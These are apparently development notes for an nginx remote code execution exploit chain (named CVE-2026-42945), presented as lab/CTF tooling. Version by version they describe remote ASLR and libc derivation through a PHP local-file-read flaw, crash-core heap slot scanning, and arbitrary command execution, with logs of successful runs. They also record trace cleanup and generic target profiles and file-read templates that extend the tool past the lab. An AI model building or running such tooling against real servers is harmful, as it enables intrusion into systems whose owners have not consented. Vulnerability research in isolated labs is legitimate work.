# Demo PoC Improvement Notes

Last updated: 2026-05-15 05:32:17 CEST

## Scope

The original working exploit path is preserved. The improved demo runners are separate files with minor-version suffixes:

- `demo_ctf_exploit_v1_1.py`
- `demo_ctf_exploit_v1_2.py`
- `demo_ctf_exploit_v1_3.py`
- `demo_ctf_exploit_v1_4.py`
- `demo_ctf_exploit_v1_5.py`
- `demo_ctf_exploit_v1_6.py`

Both runners are still lab/CTF tooling. They keep the same remote-only rule for exploit inputs: target facts are learned over the HTTP-exposed PHP local-file-read primitive and HTTP behavior, not from SSH, Docker exec, a target-side debugger, or hardcoded ASLR bases.

## v1.1 Changes

`demo_ctf_exploit_v1_1.py` adds the first technical hardening pass for recording-quality demos:

- Remote preflight for HTTP/1.1 liveness, same-port HTTP/2 support, ASLR state, core-dump settings, boot ID, and expected nginx config strings.
- Structured run artifacts under `artifacts/demo_v1_1_<timestamp>.json`.
- Core PID note parsing from the LFI-read ELF core, so the probe core can be correlated with the worker that was expected to crash.
- Unique nonce slot probes for freshness checks.
- Bounded geometry auto-calibration around the known-good `a_count=127`, `plus_count=962` shape.
- Candidate ranking that prefers slots in the corrupted/probe cleanup pool window.
- Recovery and reset before final attempts, with fresh worker address derivation after reset.

Validated command:

```bash
./demo_ctf_exploit_v1_1.py \
  --host <target-host> --port 19321 \
  --fast --no-color --artifact-dir artifacts
```

Observed result:

```text
randomize_va_space: 2
core PID matched pre-probe worker PID 2394
fresh nonce found in core: 1010 URI-safe / 10437 slots
ranked matching slots: 166
winning address: 0x5641c34f4627
winning body offset: 80
run artifact: artifacts/demo_v1_1_20260515-050301.json
```

Status: pass.

## v1.2 Changes

`demo_ctf_exploit_v1_2.py` builds on v1.1 with one more reliability step: it uses the reset crash as a second probe and re-scans that fresh core before final exploitation.

Technical differences from v1.1:

- Adds remote `/etc/os-release` and `/proc/version` fingerprinting to the artifact.
- Adds git commit/branch/dirty-state metadata and argv capture to the artifact.
- Records the pre-reset worker PID.
- After the controlled reset crash, parses the reset core PID notes and verifies that the core belongs to the pre-reset worker.
- Re-scans the reset core for the same nonce, cleanup pools, corrupted/probe pool, and ranked fake-cleanup slots.
- Uses reset-core candidates for final exploitation when available.
- Adds `--require-reset-core` to force the run to fail instead of falling back to the earlier calibration core.
- Waits for worker recovery before moving to the next final candidate if an attempt crashes without proof.

Validated command:

```bash
./demo_ctf_exploit_v1_2.py \
  --host <target-host> --port 19321 \
  --fast --no-color --require-reset-core \
  --artifact-dir artifacts
```

Observed result:

```text
randomize_va_space: 2
os release: Ubuntu 22.04.3 LTS
pre-reset worker PID: 2474
reset core PID matched expected worker 2474
reset core nonce found: 1204 URI-safe / 10437 slots
reset ranked matching slots: 155
using 155 candidates from the fresh reset core
winning address: 0x56389b17277a
winning body offset: 0
run artifact: artifacts/demo_v1_2_20260515-050555.json
```

Status: pass. This is the stricter demo runner because the final candidate list is proven to come from the most recent controlled reset crash.

## v1.3 Changes

`demo_ctf_exploit_v1_3.py` adds stricter freshness and layout-drift checks:

- Re-derives worker/libc facts before each calibration probe, avoiding stale expected PIDs after crashes.
- Adds target snapshots to the JSON artifact.
- Enforces strict core PID matching by default when a core PID note is present.
- Captures a pre-reset target layout snapshot, then compares it with the post-reset final worker.
- Fails on strict layout drift for nginx image base/path, libc base/path, and `system()` address.

Validated command:

```bash
./demo_ctf_exploit_v1_3.py \
  --host <target-host> --port 19321 \
  --fast --no-color --require-reset-core \
  --artifact-dir artifacts
```

Observed result:

```text
initial worker PID: 2602
reset core PID: [2604]
reset core nonce found: 928 URI-safe / 10437 slots
pre-reset to final worker: system address stable
winning address: 0x557f3875677a
winning body offset: 0
run artifact: artifacts/demo_v1_3_20260515-051328.json
```

Status: pass.

## v1.4 Changes

`demo_ctf_exploit_v1_4.py` adds stricter fail-fast checks before noisy exploit attempts:

- Strict preflight is enabled by default for ASLR, core settings, expected nginx config strings, and single-worker lab topology.
- `--no-strict-preflight` and `--allow-multiple-workers` are available for diagnostics.
- Final candidates are sanity-filtered for duplicate addresses, aligned body offsets, command fit inside the 4000-byte body, and URI-safe low overwrite bytes.
- The artifact records the final payload size and candidate filter counts.

Validated command:

```bash
./demo_ctf_exploit_v1_4.py \
  --host <target-host> --port 19321 \
  --fast --no-color --require-reset-core \
  --artifact-dir artifacts
```

Observed result:

```text
initial worker PID: 2680
reset core PID: [2681]
reset core nonce found: 896 URI-safe / 10437 slots
candidate sanity kept: 45
candidate sanity dropped: 0
winning address: 0x55b9f862777a
winning body offset: 0
run artifact: artifacts/demo_v1_4_20260515-051517.json
```

Status: pass.

## v1.5 Changes

`demo_ctf_exploit_v1_5.py` adds bounded campaign mode:

- `--rounds` repeats the calibration, reset-core scan, and final-candidate path with fresh nonce/core state if a round is exhausted.
- `--round-backoff` rate-limits retries between rounds.
- The artifact now records per-round calibration attempts, selected geometry, reset-core facts, layout checks, candidate filtering, and winner metadata.

Validated command:

```bash
./demo_ctf_exploit_v1_5.py \
  --host <target-host> --port 19321 \
  --fast --no-color --require-reset-core \
  --rounds 2 --artifact-dir artifacts
```

Observed result:

```text
exploit rounds: 2
round 1 reset core PID: [2759]
round 1 reset core nonce found: 928 URI-safe / 10437 slots
candidate sanity kept: 166
candidate sanity dropped: 0
winning address: 0x557c5768677a
winning body offset: 0
run artifact: artifacts/demo_v1_5_20260515-051730.json
```

Status: pass. The first round won, so the second round was not needed.

## v1.6 Changes

`demo_ctf_exploit_v1_6.py` adds the requested reliability and research features:

- Hardened proof command construction with shell quoting.
- `--exec-cmd` to run and capture arbitrary lab commands such as `id` or `whoami` into the marker file.
- Optional delayed cleanup with `--cleanup-delay` and `--cleanup-core`.
- Stale marker checks before exploitation.
- Remote nginx/libc SHA-256 and ELF build-ID fingerprinting through LFI.
- Negative-path testing with `--negative-test bad-candidate --negative-test-only --expected-fail`.
- Best-effort multi-worker support via `--worker-mode correlate`; strict core PID matching remains the main guard.
- Artifact summarization through `summarize_demo_artifacts.py`.

Validated negative-path command:

```bash
./demo_ctf_exploit_v1_6.py \
  --host <target-host> --port 19321 \
  --fast --no-color --require-reset-core \
  --negative-test bad-candidate --negative-test-only --expected-fail \
  --no-binary-fingerprint --artifact-dir artifacts
```

Observed result:

```text
negative candidate produced no marker proof
status: negative_pass
run artifact: artifacts/demo_v1_6_20260515-053017.json
```

Validated command-exec/fingerprint command:

```bash
./demo_ctf_exploit_v1_6.py \
  --host <target-host> --port 19321 \
  --fast --no-color --require-reset-core --rounds 2 \
  --exec-cmd id --cleanup-delay 30 --cleanup-core \
  --artifact-dir artifacts
```

Observed result:

```text
nginx build-id: 060e053ab1fa1a2876b7fe0ff4eff0cc777857b6
libc build-id: 095c7ba148aeca81668091f718047078d57efddb
candidate sanity kept: 195
candidate sanity dropped: 29
winning address: 0x55a491955627
winning body offset: 80
command output: uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
run artifact: artifacts/demo_v1_6_20260515-053037.json
```

Cleanup check after the delay:

```text
marker LFI read: 404
/app/tmp/core LFI read: 404
```

Status: pass.

## v1.8 Changes

`demo_ctf_exploit_v1_8.py` is the current operator-facing runner.

- Default output is compact: banner, target preflight, ASLR/version summary, selected geometry, candidate counts, final proof, artifact path, and final command output.
- `-v` / `--verbose` restores the detailed probe, candidate, and key/value trace useful for debugging.
- `--cmd` is the normal command-execution path; the captured command output is printed last, with bounded wrapping/truncation.
- `--help` is focused on target, operation, output, and the custom file-read hook. `--advanced-help` contains calibration, negative-test, and low-level tuning controls.
- The start banner and help now name `CVE-2026-42945`, the rewrite/set args-escaping mismatch, the vulnerable `/api/...` route, same-port HTTP/2 victim, and fixed upstream releases.
- The local-file-read primitive is modular. The default remains `/lfi.php?file=<path>&offset=<n>&length=<n>`, but `--file-read-template` can target another CTF app's file-download/LFI shape.
- `--target-profile generic` skips this fork's lab-specific nginx config assertions for custom platforms while preserving the runtime checks required by the exploit chain.

Validated compact command:

```bash
./demo_ctf_exploit_v1_8.py \
  --host <target-host> --cmd 'id; uname -a; seq 1 20' \
  --fast --artifact-dir artifacts
```

Observed result:

```text
target profile: lab
nginx worker PID: 3058
HTTP Server: nginx/1.31.0
PHP version: 8.1.2-1ubuntu2.23
libc dpkg version: 2.35-0ubuntu3.13
winning address: 0x55e4210b2127
winning body offset: 1376
run artifact: artifacts/demo_v1_8_20260515-055614.json
command output was printed as the final block
```

Validated template-backed file-read command:

```bash
./demo_ctf_exploit_v1_8.py \
  --host <target-host> --cmd id --fast --rounds 1 \
  --artifact-dir artifacts \
  --file-read-template 'http://{host}:{port}/lfi.php?file={path_url}{range_query}'
```

Observed result:

```text
File read: http://{host}:{port}/lfi.php?file={path_url}{range_query}
winning address: 0x55e4210b2127
winning body offset: 1376
command output: uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
run artifact: artifacts/demo_v1_8_20260515-055639.json
```

Status: pass. Both the default query-param adapter and the template adapter were live-tested against the VM target.

## v1.9 Changes

`demo_ctf_exploit_v1_9.py` keeps the v1.8 behavior but changes final command-output rendering.

- Removed the framed output block and per-line `|` prefixes.
- Removed forced wrapping; the terminal handles visual wrapping, while the script only enforces max-line and max-character safety limits.
- The command result is printed last as plain terminal text in a high-contrast color when color is enabled.
- Confirmed `phpinfo()` is optional: with `--phpinfo-path ''`, the PHP fields report `not learned` but ASLR derivation and exploitation still use the file-read primitive and succeed.
- `--host` now accepts `HOST:PORT`; `--port` remains available as a fallback/override for legacy command lines.

Validated command:

```bash
./demo_ctf_exploit_v1_9.py \
  --host <target-host>:19321 --cmd 'ls -la /app/tmp' \
  --fast --artifact-dir artifacts --phpinfo-path ''
```

Observed result:

```text
PHP version: not learned
winning address: 0x55e4210b2127
winning body offset: 1376
run artifact: artifacts/demo_v1_9_20260515-060251.json
```

The final command output was plain:

```text
total 1836
drwxr-xr-x 2 nobody nogroup    4096 May 15 04:02 .
drwxr-xr-x 4 root   root       4096 May 14 21:58 ..
-rw------- 1 nobody nogroup 2531328 May 15 04:02 core
-rw-r--r-- 1 root   root          5 May 15 03:40 nginx.pid
```

Status: pass.

Validated `HOST:PORT` command:

```bash
./demo_ctf_exploit_v1_9.py \
  --host <target-host>:19321 --cmd id \
  --fast --rounds 1 --artifact-dir artifacts --phpinfo-path ''
```

Observed result:

```text
Target: <target-host>:19321
PHP version: not learned
[04] Remote command verification setup
winning address: 0x55e4210b2127
winning body offset: 1376
command output: uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
run artifact: artifacts/demo_v1_9_20260515-060834.json
```

Status: pass.

## nginx_rifter v2 Changes

`nginx_rifter.py` is the v2 assessment-first entry point.

- Default behavior is assessment only; it does not run the crashing exploit path.
- Profiles the local-file-read primitive for text reads, binary reads, ranged reads, `/proc/self/status`, and `/proc/self/maps`.
- Fingerprints OS, kernel, nginx, libc, build IDs, hashes, and libc package version when readable.
- Discovers nginx worker maps and derives libc `system()` when the file-read permissions allow it.
- Discovers nginx config paths from master cmdline plus common paths and detects vulnerable `rewrite` + `set` candidates.
- Produces a viability matrix for the current core-guided chain.
- Keeps exploit execution behind explicit `--exploit --cmd ...`. Older v2 builds handed off to `demo_ctf_exploit_v1_9.py`; the current build integrates the exploit path directly.

Validated assessment:

```bash
./nginx_rifter.py --target <target-host>:19321 \
  --artifact-dir artifacts --no-color \
  --output artifacts/nginx_rifter_20260515-v2-final.json
```

Observed result:

```text
HTTP/2 cleartext: yes
ranged reads: True
worker maps: readable
system(): 0x7fca47abdd70
rewrite/set candidates: 1
verdict: ready-with-lab-like-core-leak
```

Validated custom file-read template:

```bash
./nginx_rifter.py --target <target-host>:19321 \
  --file-read-template 'http://{host}:{port}/lfi.php?file={path_url}{range_query}' \
  --artifact-dir artifacts --no-color \
  --output artifacts/nginx_rifter_20260515-v2-template.json
```

Validated explicit exploit mode:

```bash
./nginx_rifter.py --target <target-host>:19321 \
  --artifact-dir artifacts --no-color \
  --exploit --cmd id --fast --exploit-rounds 1 --phpinfo-path ''
```

Status: pass.

## Recommended Demo Command

For video recording:

```bash
./demo_ctf_exploit_v1_9.py --host <target-host>:19321 --cmd id --clear
```

For a fast validation run:

```bash
./demo_ctf_exploit_v1_9.py --host <target-host>:19321 --cmd id --fast
```

## Remaining Technical Limits

- This still depends on readable crash cores as the strong memory-disclosure primitive.

## nginx_rifter Self-Contained Refactor

The current `nginx_rifter.py` no longer imports `demo_ctf_exploit_v1_9.py`, `ctf_remote_exploit.py`, or `poc.py`, and no longer shells out to an older runner for `--exploit`.

Changes:

- Inlined the HTTP file-read adapter, including template-backed LFI/download vectors.
- Inlined nginx worker discovery, same-UID `/proc/<pid>/maps` parsing, remote libc `system()` derivation, ELF build-ID extraction, binary hashing, and version-string scanning.
- Inlined HTTP/2 probing plus the spray/trigger/core slot scanner needed by the integrated exploit path.
- Replaced the older split-runner exploit path with `Integrated Exploit Path`.
- Added `--derive-only` to validate exploit-side ASLR/libc derivation without sending crash probes.
- Moved low-level geometry/core tuning options behind `--advanced-help` so default `--help` remains focused.

Docker verification:

- Assessment passed against `127.0.0.1:19321`.
- Custom `--file-read-template` passed against the same Docker route.
- `--exploit --derive-only --cmd id` passed and wrote exploit derivation metadata into the JSON artifact.
- A bounded one-candidate exploit smoke produced a worker crash, parsed core program headers, and exercised slot/pool scanning. It was not expected to win because the Docker runtime is only a regression target here and the scan was intentionally capped.
- The same-port lab intentionally uses one nginx worker for reproducibility. Multiple production workers would require worker selection or more retry logic.
- The exploit is calibrated for the current lab nginx build, Ubuntu userspace, and HTTP/2 connection-pool layout.
- The chain is stronger than a hardcoded-offset demo because ASLR-sensitive bases and final heap candidates are derived remotely, but it remains a lab chain rather than a claim about default production exploitability.
